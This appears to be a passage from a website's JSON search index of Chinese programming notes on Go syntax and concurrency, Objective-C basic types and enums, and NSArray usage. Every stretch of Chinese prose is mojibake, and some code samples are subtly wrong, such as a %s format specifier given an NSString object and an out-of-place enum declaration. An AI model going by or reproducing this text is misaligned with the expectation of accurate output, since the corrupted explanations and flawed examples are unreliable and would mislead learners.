è¿™ä¸€ä¸ªå…³é”®å­—è¿›è¡Œå¾ªç¯ï¼Œä½†æ˜¯å´å¯ä»¥æ‰§è¡Œ C ä¸­æ‰€æœ‰å…³é”®å­—çš„åŠŸèƒ½ï¼š\nfor init; condition; post { }  for condition { }  for { }  for key, value := range oldMap {  newMap[key] = value } å…¶ä¸­ range å¾ªç¯å¯ä»¥å¯¹å­—ç¬¦ä¸²ã€æ•°ç»„ã€åˆ‡ç‰‡ç­‰è¿›è¡Œè¿­ä»£è¾“å‡ºå…ƒç´ ï¼Œä¸‹é¢ä¸¾ä¸ªä¾‹å­ï¼š\npackage main import \u0026#34;fmt\u0026#34;  func main() {  strings := []string{\u0026#34;google\u0026#34;, \u0026#34;runoob\u0026#34;}  for i, s := range strings {  fmt.Println(i, s)  }   numbers := [6]int{1, 2, 3, 5}  for i,x:= range numbers {  fmt.Printf(\u0026#34;ç¬¬ %d ä½ x çš„å€¼ = %d\\n\u0026#34;, i,x)  } } åœ¨å¾ªç¯è¯­å¥ä¸­å¯ä»¥ä½¿ç”¨ break/continue/goto è¿›è¡Œæ§åˆ¶ã€‚\nå‡½æ•° #  Go è¯­è¨€å‡½æ•°å®šä¹‰æ ¼å¼å¦‚ä¸‹ï¼š\nfunc function_name( [parameter list] ) [return_types] {  // ...å‡½æ•°ä½“ } Go è¯­è¨€çš„å‡½æ•°å¯ä»¥è¿”å›å¤šä¸ªå€¼ï¼š\npackage main import \u0026#34;fmt\u0026#34;  func swap(x, y string) (string, string) {  return y, x }  func main() {  a, b := swap(\u0026#34;Google\u0026#34;, \u0026#34;Runoob\u0026#34;)  fmt.Println(a, b) } Go è¯­è¨€å¯ä»¥å®šä¹‰å¼•ç”¨ä¼ å€¼ï¼š\nfunc swap(x *int, y *int) {  var temp int  temp = *x /* ä¿æŒ x åœ°å€ä¸Šçš„å€¼ */  *x = *y /* å°† y å€¼èµ‹ç»™ x */  *y = temp /* å°† temp å€¼èµ‹ç»™ y */ } æ•°æ®ç±»å‹ #  æ•°ç»„ #  å£°æ˜æ•°ç»„è¯­æ³•ï¼š\nvar variable_name [SIZE] variable_type  var variable_name [SIZE1][SIZE2]...[SIZEN] variable_type // å¤šç»´æ•°ç»„ åˆå§‹åŒ–æ•°ç»„çš„æ–¹å¼ï¼š\nvar balance = [5]float32{1000.0, 2.0, 3.4, 7.0, 50.0}  var balance = [...]float32{1000.0, 2.0, 3.4, 7.0, 50.0} // è‡ªåŠ¨æ¨æ–­æ•°ç»„é•¿åº¦  a := [3][4]int{  {0, 1, 2, 3} , /* ç¬¬ä¸€è¡Œç´¢å¼•ä¸º 0 */  {4, 5, 6, 7} , /* ç¬¬äºŒè¡Œç´¢å¼•ä¸º 1 */  {8, 9, 10, 11}, /* ç¬¬ä¸‰è¡Œç´¢å¼•ä¸º 2 */ } æŒ‡é’ˆ #  å£°æ˜æŒ‡é’ˆçš„è¯­æ³•ï¼š\nvar var_name *var-type ç©ºæŒ‡é’ˆçš„å€¼ä¸º nilã€‚\nå®šä¹‰æŒ‡é’ˆæ•°ç»„ï¼ˆå­˜å‚¨ç€æŒ‡é’ˆçš„æ•°ç»„ï¼‰é€šè¿‡ä»¥ä¸‹çš„æ–¹å¼ï¼š\nvar ptr [MAX]*int; ç»“æ„ #  ä¸ C è¯­è¨€ä¸­ç±»ä¼¼ï¼Œå£°æ˜çš„è¯­æ³•ï¼š\ntype struct_variable_type struct {  member definition  member definition  ...  member definition } åˆ‡ç‰‡ #  å¯¹æ•°ç»„çš„æŠ½è±¡ï¼Œå› ä¸ºæ•°ç»„çš„é•¿åº¦æ˜¯å›ºå®šçš„ï¼Œä½¿ç”¨èŒƒå›´æœ‰é™ï¼Œä¸æ•°ç»„ç›¸æ¯”åˆ‡ç‰‡çš„é•¿åº¦æ˜¯ä¸å›ºå®šçš„ï¼Œå¯ä»¥è¿½åŠ å…ƒç´ ï¼Œåœ¨è¿½åŠ æ—¶å¯èƒ½ä½¿åˆ‡ç‰‡çš„å®¹é‡å¢å¤§ã€‚\nå®šä¹‰åˆ‡ç‰‡ï¼š\nvar identifier []type  var slice1 []type = make([]type, len, capacity) // capacity æ˜¯å¯é€‰å‚æ•° èŒƒå›´ #  é›†åˆ #  Map æ˜¯ä¸€ç§æ— åºçš„é”®å€¼å¯¹çš„é›†åˆã€‚Map æœ€é‡è¦çš„ä¸€ç‚¹æ˜¯é€šè¿‡ key æ¥å¿«é€Ÿæ£€ç´¢æ•°æ®ï¼Œkey ç±»ä¼¼äºç´¢å¼•ï¼ŒæŒ‡å‘æ•°æ®çš„å€¼ã€‚Map çš„åº•å±‚æ˜¯é€šè¿‡å“ˆå¸Œè¡¨å®ç°çš„ã€‚\nå¯ä»¥ä½¿ç”¨å†…å»ºå‡½æ•° make ä¹Ÿå¯ä»¥ä½¿ç”¨ map å…³é”®å­—æ¥å®šä¹‰ Mapï¼š\n/* å£°æ˜å˜é‡ï¼Œé»˜è®¤ map æ˜¯ nil */ var map_variable map[key_data_type]value_data_type  /* ä½¿ç”¨ make å‡½æ•° */ map_variable := make(map[key_data_type]value_data_type) æ¥å£ #  Go è¯­è¨€æä¾›äº†å¦å¤–ä¸€ç§æ•°æ®ç±»å‹å³æ¥å£ï¼Œå®ƒæŠŠæ‰€æœ‰çš„å…·æœ‰å…±æ€§çš„æ–¹æ³•å®šä¹‰åœ¨ä¸€èµ·ï¼Œä»»ä½•å…¶ä»–ç±»å‹åªè¦å®ç°äº†è¿™äº›æ–¹æ³•å°±æ˜¯å®ç°äº†è¿™ä¸ªæ¥å£ã€‚\nä¾‹å­ï¼š\n/* å®šä¹‰æ¥å£ */ type interface_name interface {  method_name1 [return_type]  method_name2 [return_type]  method_name3 [return_type]  ...  method_namen [return_type] }  /* å®šä¹‰ç»“æ„ä½“ */ type struct_name struct {  /* variables */ }  /* å®ç°æ¥å£æ–¹æ³• */ func (struct_name_variable struct_name) method_name1() [return_type] {  /* æ–¹æ³•å®ç° */ } ... func (struct_name_variable struct_name) method_namen() [return_type] {  /* æ–¹æ³•å®ç°*/ } å¹¶å‘ #  go è¯­è¨€çš„æ ¸å¿ƒä¼˜åŠ¿åœ¨äºå¹¶å‘çš„å®ç°ï¼Œæ‰€ä»¥ go åœ¨å·¥ç¨‹æ„ä¹‰ä¸Šæ˜¯ä¸€ä¸ªæ›´é€‚åˆåšâ€œåˆ†å¸ƒå¼ç³»ç»Ÿâ€çš„åç«¯è¯­è¨€ï¼Œè€Œä¸é€‚åˆåšç§‘å­¦è®¡ç®—ã€‚\ngoroutine #  æˆ‘ä»¬å¯ä»¥ç”¨ go å…³é”®è¯æ¥å¼€å¯ä¸€ä¸ª goroutineï¼š\n goroutine æ˜¯è½»é‡çº§çº¿ç¨‹ï¼Œgoroutine çš„è°ƒåº¦æ˜¯ç”± Golang è¿è¡Œæ—¶è¿›è¡Œç®¡ç†çš„ã€‚ åŒä¸€ä¸ªç¨‹åºä¸­çš„æ‰€æœ‰ goroutine å…±äº«åŒä¸€ä¸ªåœ°å€ç©ºé—´ã€‚  è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š\ngo å‡½æ•°å( å‚æ•°åˆ—è¡¨ ) channel #  goroutine æ˜¯ go è¯­è¨€ä¸­ç”¨äºå£°æ˜æ–°çš„çº¿ç¨‹çš„æ–¹å¼ï¼Œchannel åˆ™æ˜¯ go ä¸­ç”¨äºè¿›è¡Œçº¿ç¨‹é—´é€šä¿¡çš„æ–¹å¼ã€‚\n å…³é”®å­— channelï¼š å¯ç”¨äºä¸¤ä¸ª goroutine ä¹‹é—´é€šè¿‡ä¼ é€’ä¸€ä¸ªæŒ‡å®šç±»å‹çš„å€¼æ¥åŒæ­¥è¿è¡Œå’Œé€šè®¯ã€‚ å£°æ˜ makeï¼šå£°æ˜ä¸€ä¸ªå˜é‡ä½¿ç”¨ make å‡½æ•°ã€‚æ¯”å¦‚ make(chan int) å£°æ˜äº†ä¸€ä¸ªï¼Œå¯ä»¥ç”¨äºä¼ é€’ int ç±»å‹æ•°æ®çš„ç®¡é“ã€‚ æ“ä½œç¬¦ \u0026lt;-ï¼š ç”¨äºæŒ‡å®šé€šé“çš„æ–¹å‘ï¼Œå‘é€æˆ–æ¥æ”¶ã€‚å¦‚æœæœªæŒ‡å®šæ–¹å‘ï¼Œåˆ™ä¸ºåŒå‘é€šé“ã€‚ éå†é€šé“ï¼Œä½¿ç”¨å…³é”®å­— rangeï¼šåƒéå†åˆ‡ç‰‡ä¸€æ ·çš„ for å¾ªç¯ï¼› å…³é—­ç®¡é“ï¼Œä½¿ç”¨å‡½æ•° closeï¼šå¦‚æœæœ‰æŸä¸ª goroutine æ­£åœ¨è¿›è¡Œ range éå†ï¼Œå®ƒåªæœ‰åœ¨ç®¡é“å…³é—­æ—¶æ‰ä¼šç»“æŸï¼Œå¦åˆ™ä¼šä¸€ç›´é˜»å¡ã€‚  ä¸‹é¢æ˜¯ä¸€ä¸ªå£°æ˜å¹¶ä¸”ä½¿ç”¨çš„ä¾‹å­ï¼š\nch := make(chan int) // æŒ‡å®šç¬¬äºŒä¸ªå‚æ•°å¯ä»¥æŒ‡å®šç¼“å†²åŒºå¤§å°  ch \u0026lt;- v // æŠŠ v å‘é€åˆ°é€šé“ ch v := \u0026lt;-ch // ä» ch æ¥æ”¶æ•°æ®ï¼Œå¹¶æŠŠå€¼èµ‹ç»™ v ä¸Šé¢çš„ make å‡½æ•°å¦‚æœæŒ‡å®šäº†ç¬¬äºŒä¸ªå‚æ•°åˆ™æŒ‡å®šäº†ç¼“å†²åŒºå¤§å°ã€‚å¦‚æœé€šé“ä¸å¸¦ç¼“å†²ï¼Œåœ¨é€šé“ä¸­æœ‰å†…å®¹æ—¶ï¼Œå‘é€æ–¹ä¼šé˜»å¡ç›´åˆ°æ¥æ”¶æ–¹ä»é€šé“ä¸­æ¥æ”¶äº†å€¼ã€‚\n"},{"id":23,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/1.%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/","title":"1.åŸºæœ¬è¯­æ³•","section":"Objective-C\u0026SDK","content":"åŸºæœ¬è¯­æ³• #  åŸºæœ¬ç±»å‹ #  å¸ƒå°”å‹ #  å¸ƒå°”å‹ä¸»è¦æœ‰ä¸¤ç§ä½¿ç”¨æ–¹å¼ï¼š\nBOOL v1 = YES;\t// å¸¸ç”¨çš„å¸ƒå°”å‹ä½¿ç”¨æ–¹å¼ï¼Œä¸¤ä¸ªå–å€¼åˆ†åˆ«æ˜¯ YES, NO  bool v2 = false;\t// ä¸¤ä¸ªå–å€¼åˆ†åˆ«æ˜¯ true, false ä¸Šé¢çš„ä¸¤ç§æ–¹å¼ä¸æ˜¯ç­‰ä»·çš„ï¼Œå‰è€…æ˜¯é€šè¿‡ä¸‹é¢çš„æ–¹å¼å®ç°çš„ï¼š\n#if (TARGET_OS_IPHONE \u0026amp;\u0026amp; __LP64__) || TARGET_OS_WATCH \t#define OBJC_BOOL_IS_BOOL 1 \ttypedef bool BOOL; #else \t#define OBJC_BOOL_IS_CHAR 1 \ttypedef unsigned char BOOL; #endif æ•´æ•°å‹ #  é™¤äº† C ä¸­å®ç°çš„æ•´æ•°å’Œæ— ç¬¦å·æ•´æ•°ï¼ŒOC åŒæ ·ä¹Ÿå®ç°äº†ä¸¤ä¸ªæ•´æ•°ç±»å‹ï¼š\nNSInteger v1 = 8;  NSUInteger v2 = 9;  // æ— ç¬¦å·å’Œæœ‰ç¬¦å·éƒ½æ˜¯ï¼š32 ä½ç±»å‹ä¸º int, 64 ä½ç±»å‹ä¸º long åŒæ ·ä¹Ÿå¯ä»¥çœ‹çœ‹ä»–ä»¬çš„å®ç°æ–¹å¼ï¼š\n#if __LP64__ || 0 || NS_BUILD_32_LIKE_64 \ttypedef long NSInteger; \ttypedef unsigned long NSUInteger; #else \ttypedef int NSInteger; \ttypedef unsigned int NSUInteger; #endif æ•°å­—å°è£… #  Objective-C å¯¹æ•°å­—è¿›è¡Œäº†ä¸€ä¸ªç±»çš„å°è£… NSNumberã€‚\n åœ¨ c/c++ ä¸­ï¼Œå½“éœ€è¦ä½¿ç”¨æ•°å­—çš„æ—¶å€™ï¼Œæˆ‘ä»¬é€šå¸¸ä½¿ç”¨ç®€å•æ•°æ®ç±»å‹ï¼Œå¦‚ï¼šintã€longã€floatã€‚ ç„¶è€Œï¼Œåœ¨å®é™…å¼€å‘è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šé‡åˆ°éœ€è¦ä½¿ç”¨å¯¹è±¡çš„åœºæ™¯ã€‚æ‰€ä»¥ Objective-C ä¸­æä¾›äº†NSNumber ç±»ç”¨æ¥åŒ…è£…ç®€å•æ•°å­—ç±»å‹ã€‚  å®ƒå°è£…äº†ä¸€äº›æ¯”è¾ƒæœ‰ç”¨çš„åˆ›å»ºæ–¹æ³•ï¼Œä¸‹é¢æ˜¯ä¸€äº›ä¾‹å­ï¼š\nNSNumber *num1 = [NSNumber numberWithShort:1]; NSNumber *num2 = [NSNumber numberWithInt:2]; NSNumber *num3 = [NSNumber numberWithLong:3]; NSNumber *num4 = [NSNumber numberWithFloat:4]; NSNumber *num5 = [NSNumber numberWithBool:YES]; NSNumber *num6 = [NSNumber numberWithInteger:5]; é‡è½½äº† @ ç¬¦å·è¿›è¡Œèµ‹å€¼ï¼ˆè¯­æ³•ç³–ï¼‰ï¼š\nNSNumber *num1 = @1; NSNumber *num2 = @INT_MAX; NSNumber *num3 = @LONG_MAX; NSNumber *num4 = @4.0f; NSNumber *num5 = @YES; NSNumber *num6 = @NSIntegerMax;  int a = 1; NSNumber *num7 = @(a); NSNumber *num8 = @(1 + 2); PostScriptï¼š\n NSNumber è¿™ä¸ªç±»ä¸èƒ½è¿›è¡Œæ•°å€¼è¿ç®—ã€‚  å­—ç¬¦ä¸² #  Objective-C ä½œä¸ºåŒæ ·ä¹Ÿæ˜¯æ”¯æŒ C ä¸­çš„å­—ç¬¦ä¸²å®šä¹‰è¯­æ³•ï¼ˆå•å¼•å·æŒ‡å®šå•ä¸ªå­—ç¬¦ï¼ŒåŒå¼•å·æŒ‡å®šå­—ç¬¦ä¸²ï¼‰ï¼Œç„¶è€Œå¤§éƒ¨åˆ† Objective-C ç¨‹åºæ˜¯ä½¿ç”¨ä¸€ä¸ªå­—ç¬¦ä¸²ç±»çš„å°è£…ï¼š\nNSString *myString1 = @\u0026#34;Hello World\u0026#34;; NSString *myString2 = [NSString stringWithFormat:@\u0026#34;%d %s\u0026#34;, 1, @\u0026#34;String\u0026#34;];  // convert from a c-style string NSString *fromCString = [NSString stringWithCString:\u0026#34;A C string\u0026#34; encoding:NSASCIIStringEncoding]; å¯ä»¥çœ‹åˆ°å£°åä¸€ä¸ªå­—é¢é‡çš„å­—ç¬¦ä¸²ç±»å‹è¦åšçš„äº‹æƒ…ï¼Œåªæ˜¯åœ¨å­—ç¬¦ä¸²ä¹‹å‰åŠ ä¸Šä¸€ä¸ª @ ç¬¦å·ã€‚\næšä¸¾ç±»å‹ #   å‚è€ƒèµ„æ–™ï¼šhttps://www.jianshu.com/p/994dc9f4958d\n åœ¨ä¼ ç»Ÿçš„ c æšä¸¾ç±»å‹ä¸­ï¼Œä½¿ç”¨ typedef å¯ä»¥ä½¿æšä¸¾å˜é‡çš„å£°æ˜æ›´åŠ ç®€å•ï¼š\ntypedef enum {  FlyStateOne, FlyStateTwo, FlyStateThree }state;  // å®ƒä¸ä¸‹é¢çš„è¿™ç§å£°æ˜æ–¹å¼æ˜¯ç­‰ä»·çš„ enum FlyTypeState{  FlyTypeOne, FlyTypeTwo, FlyTypeThree }; FlyState stateï¼› typedef enum FlyTypeState state; c++11 æ ‡å‡†ä¸­å¯¹æšä¸¾ç±»å‹æ ‡å‡†è¿›è¡Œäº†æ‰©å……ï¼Œå¯ä»¥æŒ‡æ˜æšä¸¾çš„åº•å±‚æ•°æ®ç±»å‹ã€‚æ¯”å¦‚ï¼š\nenum FlyState:NSInteger{ //è®¾ç½®åº•å±‚æ•°æ®ç±»å‹ä¸ºNSInteger  FlyStateOne, FlyStateTwo, FlyStateThree }; é—®é¢˜æ˜¯è¿™ç§æ ‡å‡†å¹¶ä¸æ”¯æŒä½¿ç”¨ä¸Šé¢æè¿°çš„ typedef è¯­æ³•ã€‚\nObjective-C æœ€å¸¸ç”¨çš„æšä¸¾æ•°æ®ç±»å‹ NS_ENUM ä¸ NS_OPTION ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜è¯ç”Ÿï¼š\n  NS_ENUM æ˜¯ä¸€ä¸ªå®ï¼Œæ˜¯å¯¹ c++ ä¸­çš„æšä¸¾ç±»å‹çš„ä¸Šå±‚å°è£…ã€‚æ¯”å¦‚ä¸‹é¢çš„ä¸€ä¸ª NS_ENUM ä½¿ç”¨å®ä¾‹ï¼š\ntypedef NS_ENUM(NSInteger, UIViewAnimationTransition) {  UIViewAnimationTransitionNone,  UIViewAnimationTransitionFlipFromLeft,  UIViewAnimationTransitionFlipFromRight,  UIViewAnimationTransitionCurlUp,  UIViewAnimationTransitionCurlDown, };  UIViewAnimationTransition trans = UIViewAnimationTransitionNone; å¦‚æœç¼–è¯‘å™¨æ”¯æŒæ–°æ ‡å‡†æšä¸¾åˆ™ä¸Šé¢çš„å®šä¹‰ï¼Œå±•å¼€ä¹‹åå½¢æˆä¸‹é¢çš„ä»£ç ï¼š\ntypedef enum UIViewAnimationTransition:NSInteger UIViewAnimationTransition;  enum UIViewAnimationTransition: NSInteger{  UIViewAnimationTransitionNone,  UIViewAnimationTransitionFlipFromLeft,  UIViewAnimationTransitionFlipFromRight,  UIViewAnimationTransitionCurlUp,  UIViewAnimationTransitionCurlDown, }; å¦‚æœç¼–è¯‘å™¨ä¸æ”¯æŒè¿™ç§è¯­æ³•ï¼Œé‚£ä¹ˆè¿™ç§å£°æ˜ä¸æœ€å¼€å§‹åˆ—ä¸¾çš„ typedef æ˜¯ä¸€æ ·çš„ã€‚\n  NS_OPTIONS ä¹Ÿæ˜¯ä¸€ä¸ªæšä¸¾ç±»å‹ï¼Œå®ƒå¯ä»¥ç”¨äºå°†ç‰¹å¾å­˜å‚¨åœ¨æ•´æ•°çš„ä¸åŒæ¯”ç‰¹ä½ä¸Šã€‚æ¯”å¦‚ä¸‹é¢è¿™ä¸ªï¼š\ntypedef NS_OPTIONS(NSUInteger, UIViewAutoresizing) {  UIViewAutoresizingNone = 0,  UIViewAutoresizingFlexibleLeftMargin = 1 \u0026lt;\u0026lt; 0,  UIViewAutoresizingFlexibleWidth = 1 \u0026lt;\u0026lt; 1,  UIViewAutoresizingFlexibleRightMargin = 1 \u0026lt;\u0026lt; 2,  UIViewAutoresizingFlexibleTopMargin = 1 \u0026lt;\u0026lt; 3,  UIViewAutoresizingFlexibleHeight = 1 \u0026lt;\u0026lt; 4,  UIViewAutoresizingFlexibleBottomMargin = 1 \u0026lt;\u0026lt; 5 };  NSUInteger resize = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;   PostScript:\n åœ¨ Objective-C 2.0 ä¸­ï¼Œæä¾›äº† for-in å¾ªç¯éå†æšä¸¾ç±»å‹ï¼Œç§°ä¸ºå¿«é€Ÿæšä¸¾ã€‚  å…¶ä»–åŸºæœ¬æ•°æ®ç±»å‹ #  å…¶ä»–æ•°æ®ç±»å‹åŸºæœ¬ä¸ c ä¸­çš„è¯­æ³•ä¸€æ ·ã€‚æ¯”å¦‚ï¼š\nfloat var3 = 3.0f;//å•ç²¾åº¦æµ®ç‚¹æ•° double var4 = 4.0;//åŒç²¾åº¦æµ®ç‚¹æ•° long long var5 = 5;//64ä½æ•´æ•° char var6 = \u0026#39;a\u0026#39;;//å•ä¸ªå­—ç¬¦ ç±»ç›¸å…³æ•°æ®ç±»å‹ #  åœ¨å¼•å…¥ç±»çš„æ¦‚å¿µçš„æ—¶å€™ï¼Œä¸åŒäº c++ çš„ä¸€äº›ç‰¹æ®Šçš„ç±»å‹ï¼š\n instancetypeï¼šæ˜¯ clang å…³é”®å­—ï¼Œä½¿æ–¹æ³•è¿”å›æ‰€åœ¨ç±»çš„ç±»å‹ï¼Œåªèƒ½ç”¨ä½œæ–¹æ³•è¿”å›ç±»å‹ã€‚ idï¼šæŒ‡ä»£ä»»ä½•ä½ç½®ç±»å‹çš„ NSObject å¯¹è±¡ï¼Œç±»ä¼¼äº void*ã€‚ nilï¼šè¡¨ç¤ºæŒ‡å‘çš„å¯¹è±¡æŒ‡é’ˆä¸ºç©ºï¼Œç±»ä¼¼äº c++ ä¸­çš„ nullptrã€‚  æ§åˆ¶æµ #  å¾ªç¯ã€æ¡ä»¶è·³è½¬ï¼Œéƒ½ä¸ c ä¸­çš„ç›¸åŒã€‚\næ¶ˆæ¯ä¼ é€’ #  Objective-C é‡Œï¼Œä¸å…¶è¯´å¯¹è±¡äº’ç›¸è°ƒç”¨æ–¹æ³•ï¼Œä¸å¦‚è¯´å¯¹è±¡ä¹‹é—´äº’ç›¸ä¼ é€’æ¶ˆæ¯æ›´ä¸ºç²¾ç¡®ã€‚æ­¤äºŒç§é£æ ¼çš„ä¸»è¦å·®å¼‚åœ¨äº è°ƒç”¨æ–¹æ³•/æ¶ˆæ¯ä¼ é€’ è¿™ä¸ªåŠ¨ä½œï¼š\n C++ é‡Œç±»åˆ«ä¸æ–¹æ³•çš„å…³ç³»ä¸¥æ ¼æ¸…æ¥šï¼Œä¸€ä¸ªæ–¹æ³•å¿…å®šå±äºä¸€ä¸ªç±»åˆ«ï¼Œè€Œä¸”åœ¨ç¼–è¯‘æ—¶ï¼ˆcompile timeï¼‰å°±å·²ç»ç´§å¯†ç»‘å®šï¼Œä¸å¯èƒ½è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨ç±»åˆ«é‡Œçš„æ–¹æ³•ã€‚ ä½†åœ¨Objective-Cï¼Œç±»åˆ«ä¸æ¶ˆæ¯çš„å…³ç³»æ¯”è¾ƒæ¾æ•£ï¼Œè°ƒç”¨æ–¹æ³•è§†ä¸ºå¯¹å¯¹è±¡å‘é€æ¶ˆæ¯ï¼Œæ‰€æœ‰æ–¹æ³•éƒ½è¢«è§†ä¸ºå¯¹æ¶ˆæ¯çš„å›åº”ã€‚æ‰€æœ‰æ¶ˆæ¯å¤„ç†ç›´åˆ°è¿è¡Œæ—¶ï¼ˆruntimeï¼‰æ‰ä¼šåŠ¨æ€å†³å®šï¼Œå¹¶äº¤ç”±ç±»åˆ«è‡ªè¡Œå†³å®šå¦‚ä½•å¤„ç†æ”¶åˆ°çš„æ¶ˆæ¯ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ªç±»åˆ«ä¸ä¿è¯ä¸€å®šä¼šå›åº”æ”¶åˆ°çš„æ¶ˆæ¯ï¼Œå¦‚æœç±»åˆ«æ”¶åˆ°äº†ä¸€ä¸ªæ— æ³•å¤„ç†çš„æ¶ˆæ¯ï¼Œç¨‹åºåªä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œä¸ä¼šå‡ºé”™æˆ–å´©æºƒã€‚  æ¯”å¦‚ C++ é‡Œï¼Œé€ä¸€ä¸ªæ¶ˆæ¯ç»™å¯¹è±¡ï¼ˆæˆ–è€…è¯´è°ƒç”¨ä¸€ä¸ªæ–¹æ³•ï¼‰çš„è¯­æ³•å¦‚ä¸‹ï¼š\nobj.method(argument); Objective-C ä¸­åˆ™å†™æˆï¼š\n[obj method: argument]; æ­¤äºŒè€…å¹¶ä¸ä»…ä»…æ˜¯è¯­æ³•ä¸Šçš„å·®å¼‚ï¼Œè¿˜æœ‰åŸºæœ¬è¡Œä¸ºä¸Šçš„ä¸åŒã€‚\n"},{"id":24,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/10.%E6%95%B0%E7%BB%84%E4%B8%8E%E5%AD%97%E5%85%B8/","title":"10.æ•°ç»„ä¸å­—å…¸","section":"Objective-C\u0026SDK","content":" å‚è€ƒï¼šhttps://github.com/ming1016/study/wiki/iOSåŸºç¡€é›†åˆç±»\n æ•°ç»„ä¸å­—å…¸ #  NSArray/NSMutableArray #  åŸºæœ¬ä½¿ç”¨ #  å®šä¹‰ã€åˆå§‹åŒ–ä¸€ä¸ª NSArrayï¼Œå¯ä»¥ç”¨ä»¥ä¸‹çš„æ–¹å¼ï¼š\n// NSArray: @[] NSArray *instructors = @[ @\u0026#34;Joe\u0026#34;, @\u0026#34;Tim\u0026#34;, @\u0026#34;Jim\u0026#34;, @\u0026#34;Tom\u0026#34;, @\u0026#34;Mark\u0026#34; ];  // NSArray: arrayWithObjects/initWithObjects NSArray *instructors = [NSArray arrayWithObjects:@\u0026#34;Joe\u0026#34;, @\u0026#34;Tim\u0026#34;, @\u0026#34;Jim\u0026#34;, @\u0026#34;Tom\u0026#34;, @\u0026#34;Mark\u0026#34;, nil]; NSArray *instructors = [[NSArray alloc] initWithObjects:@\u0026#34;Joe\u0026#34;, @\u0026#34;Tim\u0026#34;, @\u0026#34;Jim\u0026#34;, @\u0026#34;Tom\u0026#34;, @\u0026#34;Mark\u0026#34;, nil]; å®šä¹‰ã€åˆå§‹åŒ–ä¸€ä¸ª NSMutableArrayï¼Œå¯ä»¥ç”¨ä»¥ä¸‹çš„æ–¹å¼ï¼š\n// NSMutableArray: copy from NSArray NSArray *instructors = @[ @\u0026#34;Joe\u0026#34;, @\u0026#34;Tim\u0026#34;, @\u0026#34;Jim\u0026#34;, @\u0026#34;Tom\u0026#34;, @\u0026#34;Mark\u0026#34; ]; NSMutableArray *mInstructors = [instructors mutableCopy];  // NSMutableArray: array with array NSMutableArray *mInstructors = [NSMutableArray arrayWithArray:@[ @\u0026#34;Joe\u0026#34;, @\u0026#34;Tim\u0026#34;, @\u0026#34;Jim\u0026#34;, @\u0026#34;Tom\u0026#34;, @\u0026#34;Mark\u0026#34; ] ];  // NSMutableArray: ä¸‹é¢ä¸‰ç§åˆå§‹åŒ–ç©ºArrayçš„æ–¹å¼æ˜¯ç­‰ä»·çš„ï¼Œå»ºè®®çš„æ–¹æ³•æ˜¯ç¬¬ä¸€ç§ NSMutableArray *mEmpty = [[NSMutableArray alloc] init]; NSMutableArray *mEmpty = [NSMutableArray new]; NSMutableArray *mEmpty = [NSMutableArray array]; å¦å¤–è¿˜æœ‰å¸¸ç”¨çš„å‡½æ•° removeObject: / removeObject:atIndex: / insertObject: / insertObject:atIndex: / replaceObjectAtIndex:withObject: ç­‰ï¼Œä¸ä¸¾ä¾‹äº†ã€‚\næ’åº #  å­˜å‚¨å†…å®¹æ˜¯å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç”¨ @selector(localizedCaseInsensitiveCompare:) æ’åºï¼š\nNSArray *array = @[@\u0026#34;John Appleseed\u0026#34;, @\u0026#34;Tim Cook\u0026#34;, @\u0026#34;Hair Force One\u0026#34;, @\u0026#34;Michael Jurewitz\u0026#34;]; NSArray *sortedArray = [array sortedArrayUsingSelector:@selector(localizedCaseInsensitiveCompare:)]; è‹¥å­˜å‚¨å†…å®¹ä¸ºæ•°å­—ï¼Œå¯ä»¥ç”¨ @selector(compare:) æ’åºï¼š\nNSArray *numbers = @[@9, @5, @11, @3, @1]; NSArray *sortedNumbers = [numbers sortedArrayUsingSelector:@selector(compare:)]; é™¤äº† sortedArrayUsingSelector: å‡½æ•°ä¹‹å¤–ï¼Œå¦å¤–è¿˜æœ‰å…¶ä»–æ’åºå‡½æ•°ï¼š\n// å‡½æ•°æŒ‡é’ˆ sortedArrayHint çš„æ’åºæ–¹å¼ - (NSData *)sortedArrayHint; - (NSArray *)sortedArrayUsingFunction:(NSInteger (*)(id, id, void *))comparator context:(void *)context; - (NSArray *)sortedArrayUsingFunction:(NSInteger (*)(id, id, void *))comparator context:(void *)context hint:(NSData *)hint;  // åŸºäºblockçš„æ’åºæ–¹æ³• - (NSArray *)sortedArrayUsingComparator:(NSComparator)cmptr; - (NSArray *)sortedArrayWithOptions:(NSSortOptions)opts usingComparator:(NSComparator)cmptr; ä¸‰ç§æ–¹å¼çš„æ€§èƒ½æ¯”è¾ƒï¼šselector æ€§èƒ½ \u0026gt; block æ€§èƒ½ \u0026gt; function æ€§èƒ½\næšä¸¾éå† #  ä½¿ç”¨ indexesOfObjectsWithOptions:passingTest è¿‡æ»¤ï¼š\nNSIndexSet *indexes = [randomArray indexesOfObjectsWithOptions:NSEnumerationConcurrent passingTest:^BOOL(id obj, NSUInteger idx, BOOL *stop) {  return testObj(obj); }]; NSArray *filteredArray = [randomArray objectsAtIndexes:indexes]; ä¼ ç»Ÿçš„æšä¸¾éå†æ–¹å¼ï¼ˆæœ¬è´¨æ˜¯ä½¿ç”¨ NSFastEnumerationï¼‰ï¼š\nNSMutableArray *mutableArray = [NSMutableArray array]; for (id obj in randomArray) {  if (testObj(obj)) {  [mutableArray addObject:obj];  } } BLOCK çš„éå†æ–¹å¼ï¼š\nNSMutableArray *mutableArray = [NSMutableArray array]; [randomArray enumerateObjectsUsingBlock:^(id obj, NSUInteger idx, BOOL *stop) {  if (testObj(obj)) {  [mutableArray addObject:obj];  } }]; é€šè¿‡ [] ä¸‹æ ‡æˆ– objectAtIndex: æ–¹æ³•éå†ï¼š\nNSMutableArray *mutableArray = [NSMutableArray array]; for (NSUInteger idx = 0; idx \u0026lt; randomArray.count; idx++) {  id obj = randomArray[idx];  if (testObj(obj)) {  [mutableArray addObject:obj];  } } ä½¿ç”¨æ¯”è¾ƒä¼ ç»Ÿçš„å­¦é™¢æ´¾ NSEnumerator 